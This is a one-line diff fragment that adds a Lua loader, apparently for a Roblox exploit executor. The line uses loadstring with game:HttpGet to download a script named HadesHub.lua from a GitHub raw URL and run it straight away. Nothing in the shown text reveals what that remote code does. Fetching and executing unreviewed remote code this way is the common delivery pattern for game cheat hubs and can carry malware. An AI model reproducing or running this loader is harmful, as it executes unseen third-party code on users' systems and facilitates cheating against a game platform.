@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hdzrblx/hub/master/HadesHub.lua", true))()
